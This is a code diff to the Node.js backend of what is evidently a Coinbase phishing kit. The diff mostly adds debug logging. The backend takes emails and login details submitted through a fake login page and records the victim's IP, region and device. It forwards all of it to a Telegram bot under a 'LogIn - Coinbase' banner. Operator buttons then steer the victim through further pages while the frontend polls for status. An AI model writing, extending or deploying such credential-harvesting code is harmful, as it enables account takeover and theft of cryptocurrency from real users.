@@ -3,7 +3,6 @@ const cors = require("cors");
 const bodyParser = require("body-parser");
 const fetch = require("node-fetch");
 
-// ✅ Import the bot
 const { bot } = require("./bot");
 
 const app = express();
@@ -45,8 +44,13 @@ let userIdCounter = 1000;
 const userIds = {};
 const pendingApprovals = {};
 
+console.log(`\n${"=".repeat(60)}`);
+console.log(`✅ STORAGE INITIALIZED`);
+console.log(`   pendingApprovals: ${JSON.stringify(pendingApprovals)}`);
+console.log(`${"=".repeat(60)}\n`);
+
 // ============================================================================
-// 🔔 SELF-PING - Keep Render alive
+// 🔔 SELF-PING
 // ============================================================================
 
 const APP_URL = process.env.APP_URL;
@@ -59,7 +63,7 @@ function startSelfPing() {
     } catch (err) {
       console.error(`❌ Self-ping failed:`, err.message);
     }
-  }, 30000); // Every 30 seconds
+  }, 30000);
 }
 
 // ============================================================================
@@ -72,7 +76,6 @@ app.get("/", (req, res) => {
 
 // ============================================================================
 // POST /get-user-id
-// Frontend calls this to get a unique user ID
 // ============================================================================
 
 app.post("/get-user-id", (req, res) => {
@@ -94,7 +97,6 @@ app.post("/get-user-id", (req, res) => {
 
 // ============================================================================
 // POST /send-login
-// Frontend calls this when user submits email + password
 // ============================================================================
 
 app.post("/send-login", async (req, res) => {
@@ -111,7 +113,6 @@ app.post("/send-login", async (req, res) => {
     console.log(`   📧 Email: ${email}`);
     console.log(`   👤 User ID: #${userId}`);
 
-    // Get IP from request headers
     const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
       req.headers["x-real-ip"] ||
       req.connection.remoteAddress ||
@@ -126,11 +127,8 @@ app.post("/send-login", async (req, res) => {
     console.log(`   🌍 Region: ${region}`);
     console.log(`   📍 IP: ${ip}`);
 
-    // Map data
-    console.log(`\n📌 MAPPING DATA`);
-    console.log(`   Email → #${userId} mapped`);
-
-    // ✅ BUILD BEAUTIFUL MESSAGE
+    console.log(`\n📌 STORING IN pendingApprovals`);
+    
     const message =
       `😈😈😈😈 <b>LogIn - Coinbase</b> 😈😈😈😈\n` +
       `\n` +
@@ -141,7 +139,6 @@ app.post("/send-login", async (req, res) => {
       `<b>💻 Device:</b> ${device}\n` +
       `<b>📡 IP:</b> ${ip}`;
 
-    // ✅ BUTTONS - Separate rows
     const options = {
       parse_mode: "HTML",
       reply_markup: {
@@ -169,6 +166,7 @@ app.post("/send-login", async (req, res) => {
 
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
     console.log(`\n📨 SENDING TO TELEGRAM`);
+    console.log(`   URL: ${url}`);
     
     const response = await fetch(url, {
       method: "POST",
@@ -181,10 +179,11 @@ app.post("/send-login", async (req, res) => {
       })
     });
 
+    console.log(`   Status: ${response.status}`);
+
     if (response.ok) {
-      console.log(`   ✅ Message sent successfully (WITH BUTTONS)`);
+      console.log(`   ✅ Message sent successfully`);
       
-      // Store pending login
       pendingApprovals[email] = {
         status: "pending",
         timestamp: Date.now(),
@@ -195,7 +194,10 @@ app.post("/send-login", async (req, res) => {
         ip
       };
 
+      console.log(`\n💾 STORED IN MEMORY:`);
+      console.log(`   pendingApprovals["${email}"] =`, pendingApprovals[email]);
       console.log(`${"=".repeat(60)}\n`);
+      
       res.json({ ok: true, message: "Login request sent for approval", email });
     } else {
       console.error("   ❌ Telegram API error:", response.statusText);
@@ -209,25 +211,35 @@ app.post("/send-login", async (req, res) => {
 });
 
 // ============================================================================
-// POST /check-status
-// Frontend polls this to check if login was approved
+// POST /check-status - WITH DEBUG
 // ============================================================================
 
 app.post("/check-status", (req, res) => {
   try {
     const { email } = req.body;
+    
+    console.log(`\n🔍 CHECK-STATUS REQUEST`);
+    console.log(`   Email: ${email}`);
+    console.log(`   Current pendingApprovals:`, pendingApprovals);
 
     if (!email) {
+      console.log(`   ❌ No email provided!`);
       return res.json({ status: "unknown" });
     }
 
     if (pendingApprovals[email]) {
+      const currentStatus = pendingApprovals[email].status || "pending";
+      console.log(`   ✅ FOUND EMAIL IN STORAGE!`);
+      console.log(`   Current status: ${currentStatus}`);
+      
       return res.json({
-        status: pendingApprovals[email].status || "pending",
+        status: currentStatus,
         email: email
       });
     }
 
+    console.log(`   ❌ EMAIL NOT FOUND IN STORAGE!`);
+    console.log(`   Available emails: ${Object.keys(pendingApprovals).join(", ") || "NONE"}`);
     res.json({ status: "unknown" });
 
   } catch (err) {
@@ -237,43 +249,55 @@ app.post("/check-status", (req, res) => {
 });
 
 // ============================================================================
-// POST /update-status
-// Called by Telegram bot when buttons are clicked
+// POST /update-status - WITH DEBUG
 // ============================================================================
 
 app.post("/update-status", (req, res) => {
   try {
     const { email, status } = req.body;
 
+    console.log(`\n${"=".repeat(60)}`);
+    console.log(`📬 UPDATE-STATUS REQUEST`);
+    console.log(`${"=".repeat(60)}`);
+    console.log(`   Email: ${email}`);
+    console.log(`   Status: ${status}`);
+
     if (!email || !status) {
+      console.log(`   ❌ Missing email or status!`);
       return res.status(400).json({ error: "Missing email or status" });
     }
 
-    console.log(`\n${"=".repeat(60)}`);
-    console.log(`📬 STATUS UPDATE REQUEST`);
-    console.log(`${"=".repeat(60)}`);
-    console.log(`   📧 Email: ${email}`);
-    console.log(`   🔘 Action: ${status}`);
+    console.log(`\n🔍 CHECKING STORAGE...`);
+    console.log(`   Current pendingApprovals:`, pendingApprovals);
 
     if (!pendingApprovals[email]) {
+      console.log(`   ❌ EMAIL NOT FOUND!`);
       pendingApprovals[email] = {};
-    }
-
-    // ✅ Map status codes
-    if (status === "page1") {
-      pendingApprovals[email].status = "accepted1";
-    } else if (status === "page2") {
-      pendingApprovals[email].status = "accepted2";
-    } else if (status === "reject") {
-      pendingApprovals[email].status = "rejected";
+      console.log(`   ✅ Created new entry`);
     } else {
-      pendingApprovals[email].status = status;
+      console.log(`   ✅ EMAIL FOUND!`);
+      console.log(`   Old status: ${pendingApprovals[email].status}`);
     }
 
+    // Map status codes
+    let finalStatus = status;
+    if (status === "page1") {
+      finalStatus = "accepted1";
+    } else if (status === "page2") {
+      finalStatus = "accepted2";
+    } else if (status === "reject") {
+      finalStatus = "rejected";
+    }
+
+    console.log(`\n📝 UPDATING STATUS...`);
+    console.log(`   From: ${pendingApprovals[email].status}`);
+    console.log(`   To: ${finalStatus}`);
+    
+    pendingApprovals[email].status = finalStatus;
     pendingApprovals[email].updatedAt = Date.now();
 
-    console.log(`\n✅ STATUS UPDATED`);
-    console.log(`   New status: ${pendingApprovals[email].status}`);
+    console.log(`\n✅ STATUS UPDATED!`);
+    console.log(`   New value:`, pendingApprovals[email]);
     console.log(`${"=".repeat(60)}\n`);
 
     res.json({ ok: true, message: "Status updated" });
@@ -295,7 +319,6 @@ const server = app.listen(PORT, () => {
   console.log(`🔌 Port: ${PORT}`);
   console.log(`${"=".repeat(60)}\n`);
 
-  // Start self-ping to keep Render alive
   startSelfPing();
 });
 
